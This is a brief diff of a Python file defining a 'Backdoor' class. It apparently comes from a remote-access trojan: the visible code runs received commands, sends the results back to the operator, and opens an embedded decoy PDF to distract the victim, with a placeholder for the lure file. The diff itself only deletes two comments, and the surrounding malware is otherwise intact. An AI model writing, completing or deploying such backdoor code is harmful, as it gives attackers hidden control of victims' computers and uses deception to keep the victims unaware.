@@ -70,10 +70,7 @@ class Backdoor:
                 command_result = "[-] Error during command execution."
             self.reliable_send(command_result)
 
-
-# Entry point
 try:
-    # Try to open the embedded PDF to distract user
     if hasattr(sys, '_MEIPASS'):
         pdf_path = os.path.join(sys._MEIPASS, 'ENTER YOUR PDF WHICH YOU WANNA USE')
         subprocess.Popen(pdf_path, shell=True)
